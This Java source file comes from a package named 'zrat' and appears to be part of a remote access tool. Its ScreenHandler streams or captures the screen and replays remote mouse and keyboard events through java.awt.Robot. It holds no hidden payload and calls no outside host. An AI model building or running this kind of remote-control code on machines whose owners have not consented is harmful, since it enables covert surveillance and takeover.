package com.zrat.server.nio.handler;

import java.awt.Robot;

import org.jboss.netty.bootstrap.ClientBootstrap;
import org.jboss.netty.channel.ChannelHandlerContext;
import org.jboss.netty.channel.MessageEvent;
import org.jboss.netty.util.Timer;

import com.zrat.server.controller.ScreenService;
import com.zrat.server.controller.ScreenServiceImpl;
import com.zrat.transfer.model.TransferDataStruct;

public class ScreenHandler extends ServerNIOHandler {

	public ScreenHandler(ClientBootstrap bootstrap, Timer timer) {
		super(bootstrap, timer);
	}

	@Override
	public void messageReceived(ChannelHandlerContext ctx, MessageEvent e) {
		ScreenService service = null;
		if (e.getMessage() instanceof TransferDataStruct) {
		
			TransferDataStruct data = (TransferDataStruct) e.getMessage();
			service = ScreenServiceImpl.getInstance();
			Robot robot = service.getRobot();
			String action = data.getAction();
			if (ScreenService.COMMAND_START.equals(action)) {
				service.startSendScreen();
			} else if (ScreenService.COMMAND_CAPTRUE.equals(action)) {
				service.capture();
			} else if (action.equalsIgnoreCase("MousePressed")) {
				int[] mouse = (int[]) data.getObject();
				robot.mousePress(mouse[2]);
			} else if (action.equalsIgnoreCase("MouseReleased")) {
				int[] mouse = (int[]) data.getObject();
				robot.mouseRelease(mouse[2]);
			} else if (action.equalsIgnoreCase("MouseMoved")) {
				int[] mouse = (int[]) data.getObject();
				robot.mouseMove(mouse[0],mouse[1]);
			} else if (action.equalsIgnoreCase("MouseWheel")) {
				int[] mouse = (int[]) data.getObject();
				robot.mouseWheel(mouse[2]);
			} else if (action.equalsIgnoreCase("KeyPressed")) {
				robot.keyPress(Integer.parseInt(data.getObject()+""));
			} else if (action.equalsIgnoreCase("KeyReleased")) {
				robot.keyRelease(Integer.parseInt(data.getObject()+""));
			} else {
				ctx.sendUpstream(e);
			}
		}
	}

}
